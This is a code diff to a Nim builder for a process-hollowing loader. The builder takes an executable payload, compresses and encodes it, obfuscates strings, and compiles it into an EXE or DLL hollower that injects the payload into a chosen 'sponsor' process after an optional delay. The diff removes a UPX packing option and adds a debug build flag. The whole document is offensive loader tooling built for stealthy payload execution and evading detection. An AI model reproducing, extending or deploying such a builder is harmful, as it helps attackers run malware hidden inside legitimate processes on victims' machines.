@@ -24,10 +24,10 @@ var pePath: string
 var injectionMethod: string
 var sponsorPath: string
 var sponsorParams: string
-var upx: string
 var outFormat: string
 var outDllExportName: string  
 var sleepSeconds: string
+var isDebug: bool
 
 # Define compiler args
 var compileExeCmd = "nim compile --app:console"         # exe format
@@ -41,12 +41,6 @@ compileFlags.add " -d:release -d:strip --opt:size"      # for minimal size
 compileFlags.add " --passL:-Wl,--dynamicbase"           # for relocation table (needed for loaders)
 compileFlags.add " --benchmarkVM:on"                    # for NimProtect key randomization
 
-proc upxPe(pePath: string): bool =
-    var upxCmd = "upx " & pePath
-    if execShellCmd(upxCmd) == 0:
-        return true
-    else:
-        return false
 
 
 when isMainModule:
@@ -61,10 +55,10 @@ when isMainModule:
         """)
         option("-s", "--sponsor", help="Sponsor path to hollow (default: self hollowing)")
         option("-a", "--args", help="Command line arguments to append to the hollowed process")
-        option("-x", "--upx", help="UPX the exe and/or the hollower and obfuscate section names (UPX should be installed in PATH)", choices = @["exe", "hollower", "both"])
         option("-f", "--format", help="PE hollower format", choices = @["exe", "dll"], default=some("exe"))
         option("-e", "--exportname", help="DLL export name (relevant only for Dll format)", default=some("DllRegisterServer"))
         option("-t", "--sleep", help="Number of seconds to sleep before hollowing", default=some("0"))
+        flag("-d", "--debug", help="Compile as debug instead of release (verbose)")
     # Parse arguments
     try:
         var opts = p.parse()
@@ -75,10 +69,10 @@ when isMainModule:
         else:
             sponsorPath = "protectString(\"" & opts.sponsor & "\")"        
         sponsorParams = opts.args
-        upx = opts.upx
         outFormat = opts.format
         outDllExportName = opts.exportname
         sleepSeconds = opts.sleep
+        isDebug = opts.debug
     except ShortCircuit as err:
         if err.flag == "argparse_help":
             echo err.help
@@ -86,10 +80,6 @@ when isMainModule:
     except UsageError:
         stderr.writeLine getCurrentExceptionMsg()
         quit(1)
-
-    # UPX the exe payload
-    if upx in ["exe", "both"]:
-        discard upxPe(pePath)
 
     # Read & compress & encode exe payload
     var peStr = readFile(pePath)
@@ -116,6 +106,10 @@ var sleepSeconds* = {sleepSeconds}
     elif injectionMethod == "2":
         compileFlags.add(" -d:hollownimline")
 
+    # Change to debug if needed
+    if isDebug:
+        discard compileFlags.replace("-d:release ", "")
+
     # Compile
     var compileCmd: string
     if outFormat == "exe":
@@ -124,12 +118,4 @@ var sleepSeconds* = {sleepSeconds}
         compileCmd = compileDllCmd & compileFlags & compileOutDll & compileDllPath
     discard execShellCmd(compileCmd)
 
-    # UPX the hollower
-    if upx in ["hollower", "both"]:
-        if outFormat == "exe":
-            compileOutExe.delete(0..3)
-            discard upxPe(compileOutExe)
-        elif outFormat == "dll":
-            compileOutDll.delete(0..3)
-            discard upxPe(compileOutDll)
     
